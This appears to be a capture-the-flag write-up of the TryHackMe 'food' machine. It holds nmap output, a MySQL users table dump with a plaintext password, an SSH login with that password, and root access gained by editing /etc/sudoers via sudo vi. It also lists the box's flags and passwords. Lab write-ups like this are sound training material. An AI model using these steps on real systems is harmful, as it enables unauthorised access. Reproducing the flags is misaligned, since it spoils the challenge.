
THM-KOTH:	food
============================

> labruhtooryboi | December 15, 2020


(box was reset)
# 10.10.100.44
# food.thm


					# reconnisance

'''
Open 10.10.224.237:22
Open 10.10.224.237:3306
Open 10.10.224.237:9999
Open 10.10.224.237:15065
Open 10.10.224.237:16109
Open 10.10.224.237:46969
'''

'''
Nmap scan report for 10.10.224.237
Host is up (0.21s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:0c:0c:d9:5a:7d:be:e6:f4:3c:ed:10:51:49:4d:19 (RSA)
|   256 17:ce:03:3b:bb:20:78:09:ab:76:c0:6d:8d:c4:df:51 (ECDSA)
|_  256 07:8a:50:b5:5b:4a:a7:6c:c8:b3:a1:ca:77:b9:0d:07 (ED25519)
3306/tcp  open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 34
|   Capabilities flags: 65535
|   Some Capabilities: LongColumnFlag, SupportsTransactions, ODBCClient, FoundRows, IgnoreSigpipes, InteractiveClient, LongPassword, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolOld, ConnectWithDatabase, Speaks41ProtocolNew, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: @/B\x1E<?sc#wD\x101"q\x1F(T"\x12
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.29_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-03-19T17:21:30
| Not valid after:  2030-03-17T17:21:30
| MD5:   a067 7d7d a831 9979 e1d7 4ca7 1e2f 5319
|_SHA-1: 5769 4d3d 4ff6 fce9 b4dd 1553 9799 9a97 0f1e 75e8
|_ssl-date: TLS randomness does not represent time
9999/tcp  open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Mon, 14 Dec 2020 04:56:50 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|     king
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Mon, 14 Dec 2020 04:56:49 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|_    king
15065/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Host monitoring
16109/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Mon, 14 Dec 2020 04:56:49 GMT
|     Content-Type: image/jpeg
|     JFIF
|     #*%%*525EE\xff
|     #*%%*525EE\xff
|     $3br
|     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     Y$?_
|     qR]$Oyk
|_    |$o.
46969/tcp open  telnet  Linux telnetd
2 services unrecognized despite returning data.
'''





					# enumeration


					
'''
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+

'''

'''
use users;
select * from User;
+----------+---------------------------------------+
| username | password                              |
+----------+---------------------------------------+
| ramen    | noodlesRTheBest                       |
| flag     | thm{2f30841ff8d9646845295135adda8332} |
+----------+---------------------------------------+
'''



					# exploitation



'''
ssh ramen@10.10.100.44
'''




					# privelage escalation
					
'''
sudo vi /etc/sudoers
'''

'''
ramen	ALL=(ALL:ALL) ALL
'''




					# interesting things

>flags
'''
mysql
thm{2f30841ff8d9646845295135adda8332}
'''

'''
/home/bread
thm{7baf5aa8491a4b7b1c2d231a24aec575}
'''

'''
/root
thm{9f1ee18d3021d135b03b943cc58f34db}
'''


'''
/home/tryhackme
thm{5a926ab5d3561e976f4ae5a7e2d034fe}
'''


>users
'''
root
ramen
food
pasta
bread
tryhackme
'''

>passwds
'''
noodlesRTheBest 
givemecookies
'''


>files and dirs
'''
/usr/bin/vim.basic
'''

>root stuff 
'''
(changed passwds so will need to wait for original shadow and passwd files)
'''

